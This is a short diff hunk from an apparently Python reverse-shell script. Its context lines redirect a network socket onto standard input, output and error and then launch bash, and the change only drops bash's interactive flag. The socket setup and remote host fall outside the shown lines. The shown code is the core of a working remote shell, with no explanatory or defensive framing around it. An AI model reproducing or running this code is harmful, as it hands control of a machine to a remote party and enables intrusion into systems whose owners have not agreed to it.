@@ -12,7 +12,7 @@ try:
         os.dup2(sock.fileno(), 0) # Stdin
         os.dup2(sock.fileno(), 1) # Stdout
         os.dup2(sock.fileno(), 2) # Stderr
-        subprocess.call(["/bin/bash", "-i"])
+        subprocess.call(["/bin/bash"])
 
 
 except Exception as e:
